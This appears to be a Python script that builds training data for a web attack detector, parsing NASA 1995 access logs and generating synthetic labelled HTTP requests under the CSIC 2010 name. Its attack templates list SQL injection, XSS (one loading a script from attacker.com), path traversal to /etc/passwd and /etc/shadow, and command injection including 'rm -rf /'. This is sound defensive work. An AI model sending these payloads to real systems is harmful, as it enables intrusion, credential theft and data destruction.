import gzip
import re
import os
import random
import math
from datetime import datetime
import pandas as pd
import numpy as np

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
NASA_GZ_PATH = os.path.join(DATA_DIR, "NASA_access_log_Jul95.gz")
HOURLY_CSV = os.path.join(DATA_DIR, "hourly_traffic.csv")
CLIENT_CSV = os.path.join(DATA_DIR, "client_profiles.csv")
CSIC_CSV = os.path.join(DATA_DIR, "csic_2010.csv")

# Common Log Format regex:
# host - - [01/Jul/1995:00:00:01 -0400] "GET /history/apollo/ HTTP/1.0" 200 6245
LOG_PATTERN = re.compile(
    r'^(\S+) \S+ \S+ \[(\d{2}/[A-Za-z]{3}/\d{4}:\d{2}:\d{2}:\d{2}) [^\]]+\] "([A-Z]+)\s+([^\s]+)[^"]*" (\d{3})'
)

def parse_nasa_logs(max_lines=None):
    print("Parsing NASA HTTP access logs from:", NASA_GZ_PATH)
    if not os.path.exists(NASA_GZ_PATH):
        raise FileNotFoundError(f"NASA dataset not found at {NASA_GZ_PATH}")

    hourly_counts = {}
    hourly_errors = {}
    client_hourly_stats = {} # (hour_key, host) -> {'requests': int, 'errors': int, 'urls': set}

    months = {"Jul": 7, "Aug": 8}
    
    count = 0
    with gzip.open(NASA_GZ_PATH, "rt", errors="ignore") as f:
        for line in f:
            count += 1
            if max_lines and count > max_lines:
                break
            match = LOG_PATTERN.match(line)
            if not match:
                continue
            
            host, ts_str, method, url, status_code = match.groups()
            status = int(status_code)
            is_error = 1 if status >= 400 else 0

            # Parse datetime: 01/Jul/1995:00:00:01
            try:
                day = int(ts_str[0:2])
                mon = months.get(ts_str[3:6], 7)
                year = int(ts_str[7:11])
                hour = int(ts_str[12:14])
                hour_dt = datetime(year, mon, day, hour)
            except Exception:
                continue

            hourly_counts[hour_dt] = hourly_counts.get(hour_dt, 0) + 1
            if is_error:
                hourly_errors[hour_dt] = hourly_errors.get(hour_dt, 0) + 1

            # Track client in 1-hour window for client profiling
            # To save memory, track on a subset of hours or sample
            if day in (2, 3, 4, 5, 6, 7, 8):
                key = (hour_dt, host)
                if key not in client_hourly_stats:
                    client_hourly_stats[key] = {"requests": 0, "errors": 0, "urls": set()}
                client_hourly_stats[key]["requests"] += 1
                if is_error:
                    client_hourly_stats[key]["errors"] += 1
                if len(client_hourly_stats[key]["urls"]) < 50:
                    client_hourly_stats[key]["urls"].add(url)

    print(f"Parsed {count} raw log lines.")
    
    # Build complete hourly DataFrame
    hours = sorted(hourly_counts.keys())
    if not hours:
        raise ValueError("No valid log lines parsed!")
    
    min_hour, max_hour = hours[0], hours[-1]
    all_hours = pd.date_range(min_hour, max_hour, freq="1h")
    df_hourly = pd.DataFrame({"timestamp": all_hours})
    df_hourly["request_count"] = df_hourly["timestamp"].map(lambda h: hourly_counts.get(h, 0))
    df_hourly["error_count"] = df_hourly["timestamp"].map(lambda h: hourly_errors.get(h, 0))
    
    # Handle zero hours (if any log outage) via interpolation
    df_hourly["request_count"] = df_hourly["request_count"].replace(0, np.nan).interpolate().fillna(method="bfill").astype(int)
    df_hourly["error_ratio"] = (df_hourly["error_count"] / df_hourly["request_count"]).fillna(0.02)
    # Clip error ratio to realistic boundaries
    df_hourly["error_ratio"] = df_hourly["error_ratio"].clip(0.001, 0.40)

    df_hourly.to_csv(HOURLY_CSV, index=False)
    print(f"Saved hourly traffic dataset ({len(df_hourly)} hours) to: {HOURLY_CSV}")

    # Build client session profiles
    profiles = []
    for (hour_dt, host), stats in client_hourly_stats.items():
        reqs = stats["requests"]
        if reqs >= 3: # active session
            rpm = round(reqs / 60.0, 3)
            err_rate = round(stats["errors"] / reqs, 3)
            uniq_urls = len(stats["urls"])
            profiles.append({
                "client_id": host,
                "requests_per_min": rpm,
                "error_rate": err_rate,
                "unique_urls": uniq_urls,
                "is_injected_anomaly": 0
            })

    # Sample baseline profiles
    random.seed(42)
    random.shuffle(profiles)
    baseline_sample = profiles[:970] if len(profiles) >= 970 else profiles

    # Inject realistic bot and attack profiles (30 injected profiles to total 1000)
    injected = [
        # HTTP Flood profiles
        {"client_id": "bot_flood_01", "requests_per_min": 4800.0, "error_rate": 0.05, "unique_urls": 2, "is_injected_anomaly": 1},
        {"client_id": "bot_flood_02", "requests_per_min": 3600.0, "error_rate": 0.08, "unique_urls": 1, "is_injected_anomaly": 1},
        {"client_id": "bot_flood_03", "requests_per_min": 5200.0, "error_rate": 0.04, "unique_urls": 3, "is_injected_anomaly": 1},
        # High error bot / brute-force / fuzzing
        {"client_id": "bot_fuzzer_01", "requests_per_min": 620.0, "error_rate": 0.78, "unique_urls": 5, "is_injected_anomaly": 1},
        {"client_id": "bot_fuzzer_02", "requests_per_min": 750.0, "error_rate": 0.85, "unique_urls": 8, "is_injected_anomaly": 1},
        {"client_id": "bot_fuzzer_03", "requests_per_min": 490.0, "error_rate": 0.72, "unique_urls": 4, "is_injected_anomaly": 1},
        # Path enumeration scanner
        {"client_id": "scanner_dir_01", "requests_per_min": 350.0, "error_rate": 0.92, "unique_urls": 120, "is_injected_anomaly": 1},
        {"client_id": "scanner_dir_02", "requests_per_min": 410.0, "error_rate": 0.89, "unique_urls": 140, "is_injected_anomaly": 1},
        # Scraping bots
        {"client_id": "bot_scraper_01", "requests_per_min": 180.0, "error_rate": 0.15, "unique_urls": 150, "is_injected_anomaly": 1},
        {"client_id": "bot_scraper_02", "requests_per_min": 220.0, "error_rate": 0.18, "unique_urls": 160, "is_injected_anomaly": 1},
        # Low and slow probe
        {"client_id": "probe_slow_01", "requests_per_min": 15.0, "error_rate": 0.95, "unique_urls": 45, "is_injected_anomaly": 1},
    ]

    # Fill up to 30 injected
    for i in range(len(injected), 30):
        injected.append({
            "client_id": f"bot_anomaly_{i}",
            "requests_per_min": round(random.uniform(250, 4000), 2),
            "error_rate": round(random.uniform(0.60, 0.95), 2),
            "unique_urls": random.randint(1, 100),
            "is_injected_anomaly": 1
        })

    all_profiles = baseline_sample + injected
    # If less than 1000, supplement with normal profiles
    while len(all_profiles) < 1000:
        all_profiles.append({
            "client_id": f"client_sim_{len(all_profiles)}",
            "requests_per_min": round(random.uniform(0.5, 20.0), 3),
            "error_rate": round(random.uniform(0.0, 0.05), 3),
            "unique_urls": random.randint(1, 18),
            "is_injected_anomaly": 0
        })

    df_client = pd.DataFrame(all_profiles[:1000])
    df_client.to_csv(CLIENT_CSV, index=False)
    print(f"Saved 1,000 client session profiles to: {CLIENT_CSV}")


def generate_csic_dataset(num_samples=3500):
    print("Generating CSIC 2010 HTTP Request Dataset...")
    random.seed(42)

    legit_endpoints = [
        "/tienda1/miembros/editar.jsp",
        "/tienda1/carrito.jsp",
        "/tienda1/publico/vaciar.jsp",
        "/tienda1/productos/ver.jsp",
        "/tienda1/index.jsp",
        "/api/v1/auth/login",
        "/api/v1/user/profile",
        "/search",
        "/checkout/payment",
        "/catalog/categories",
        "/contact/support",
        "/static/css/theme.css",
        "/images/banner.jpg"
    ]

    legit_params = [
        "id=102&category=tech&page=1",
        "user=alice&session=98a7bc&format=json",
        "q=wireless+headphones&sort=price_asc",
        "cart_id=8923&action=view",
        "lang=en&theme=dark",
        "sku=4481&qty=2&shipping=standard",
        "filter=active&order=desc&limit=25",
        "name=Robert+Smith&email=robert%40example.com",
        "step=2&token=4f6a91e0c2"
    ]

    legit_posts = [
        "username=john_doe&password=MySecurePassword123!&remember=1",
        "email=customer%40gmail.com&message=Hello+I+would+like+to+inquire+about+my+order",
        "first_name=Sarah&last_name=Connor&address=123+Main+St&city=Boston&zip=02101",
        "item=409&quantity=1&payment_method=credit_card",
        "feedback=Great+experience+fast+delivery&rating=5",
        "comment=Very+helpful+article+thanks&notify=1"
    ]

    # Attack templates
    sqli_payloads = [
        "GET /login?user=' OR 1=1 --",
        "GET /tienda1/productos/ver.jsp?id=1 UNION SELECT 1,username,password,4 FROM users--",
        "POST /api/v1/auth/login HTTP/1.1\\n\\nusername=admin'--&password=any",
        "GET /search?q=shoes'; DROP TABLE products;--",
        "GET /items?id=10' AND 1=conv('a',16,2)--",
        "GET /user?id=1' AND SLEEP(5)--",
        "POST /comment HTTP/1.1\\n\\ntext=' OR '1'='1",
        "GET /profile?id=-1 UNION ALL SELECT null,concat(table_name,0x3a,column_name) FROM information_schema.columns--",
        "GET /tienda1/publico/caracteristicas.jsp?id=' UNION SELECT null,table_name FROM information_schema.tables--",
        "POST /auth/reset HTTP/1.1\\n\\nemail=admin' OR 'x'='x",
        "GET /catalog?cat=1; WAITFOR DELAY '0:0:5'--",
        "GET /api/data?filter=1' ORDER BY 10--",
        "GET /login?user=admin'#",
        "POST /login HTTP/1.1\\n\\nuser=admin'/*&pass=*/OR 1=1#"
    ]

    xss_payloads = [
        "GET /search?q=<script>alert('XSS')</script>",
        "POST /feedback HTTP/1.1\\n\\nmessage=<img src=x onerror=alert(document.cookie)>",
        "GET /profile?name=\"><svg/onload=confirm(1)>",
        "GET /page?redirect=javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb24='))",
        "POST /comments HTTP/1.1\\n\\nauthor=<iframe src=\"javascript:alert(1)\">",
        "GET /welcome?user=<body onload=alert('Pwned')>",
        "GET /view?msg=<script src=\"http://attacker.com/evil.js\"></script>",
        "POST /submit HTTP/1.1\\n\\ninput=\"><script>prompt(1)</script>",
        "GET /greet?name=%3Cscript%3Ealert(document.domain)%3C/script%3E",
        "GET /search?term=<a href=\"javascript:alert(1)\">click</a>"
    ]

    path_traversal_payloads = [
        "GET /view?file=../../../../etc/passwd",
        "GET /image?path=..%2f..%2f..%2fwindows/win.ini",
        "GET /download.jsp?file=../../../../etc/shadow",
        "GET /doc?path=/var/log/apache2/access.log%00.jpg",
        "POST /export HTTP/1.1\\n\\nfilename=../../../../boot.ini",
        "GET /tienda1/ver.jsp?item=../../../../WEB-INF/web.xml",
        "GET /getFile?page=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "GET /read?file=....//....//....//etc/passwd"
    ]

    cmd_injection_payloads = [
        "GET /cgi-bin/status.cgi?host=127.0.0.1; whoami",
        "POST /ping HTTP/1.1\\n\\nip=127.0.0.1 | cat /etc/passwd",
        "GET /admin/tool.php?action=test && id",
        "GET /backup?type=db; rm -rf /",
        "POST /system/diagnostics HTTP/1.1\\n\\ncmd=`id`",
        "GET /api/exec?param=test%20%26%26%20dir"
    ]

    param_tamper_payloads = [
        "POST /user/update HTTP/1.1\\n\\nrole=admin&is_superuser=true&bypass_auth=1",
        "GET /admin/config.php?debug=true&bypass=1",
        "POST /transfer HTTP/1.1\\n\\namount=-5000&to_account=99999",
        "GET /account/view?userId=1&isAdmin=true",
        "POST /tienda1/carrito.jsp HTTP/1.1\\n\\nprecio=0.01&cantidad=100"
    ]

    attack_pool = (
        sqli_payloads * 15 +
        xss_payloads * 12 +
        path_traversal_payloads * 10 +
        cmd_injection_payloads * 10 +
        param_tamper_payloads * 8
    )

    rows = []

    # 1. Normal requests (approx 60%)
    num_normal = int(num_samples * 0.60)
    for _ in range(num_normal):
        method = random.choices(["GET", "POST", "PUT"], weights=[0.75, 0.22, 0.03])[0]
        endpoint = random.choice(legit_endpoints)
        
        if method == "GET":
            if random.random() < 0.65:
                query = random.choice(legit_params)
                req = f"GET {endpoint}?{query} HTTP/1.1\nHost: store.webguard.local\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: */*"
            else:
                req = f"GET {endpoint} HTTP/1.1\nHost: store.webguard.local\nUser-Agent: Mozilla/5.0\nAccept: text/html"
        else: # POST / PUT
            body = random.choice(legit_posts)
            req = f"{method} {endpoint} HTTP/1.1\nHost: store.webguard.local\nContent-Type: application/x-www-form-urlencoded\nContent-Length: {len(body)}\n\n{body}"
        
        rows.append({"request_string": req, "label": 0})

    # 2. Attack requests (approx 40%)
    num_attacks = num_samples - num_normal
    for _ in range(num_attacks):
        base_attack = random.choice(attack_pool)
        # Add realistic HTTP headers to attack
        if "\\n\\n" in base_attack or "\n\n" in base_attack:
            parts = base_attack.replace("\\n", "\n").split("\n\n")
            header_part = parts[0]
            body_part = parts[1] if len(parts) > 1 else ""
            req = f"{header_part}\nHost: store.webguard.local\nUser-Agent: WebAttacker/1.0\nContent-Length: {len(body_part)}\n\n{body_part}"
        else:
            req = f"{base_attack} HTTP/1.1\nHost: store.webguard.local\nUser-Agent: Mozilla/5.0 (SecurityScan)\nAccept: */*"
        rows.append({"request_string": req, "label": 1})

    random.shuffle(rows)
    df_csic = pd.DataFrame(rows)
    df_csic.to_csv(CSIC_CSV, index=False)
    print(f"Saved {len(df_csic)} HTTP requests (Normal={num_normal}, Attack={num_attacks}) to: {CSIC_CSV}")

if __name__ == "__main__":
    parse_nasa_logs()
    generate_csic_dataset()
    from generate_unified_dataset import generate_unified_dataset
    generate_unified_dataset()

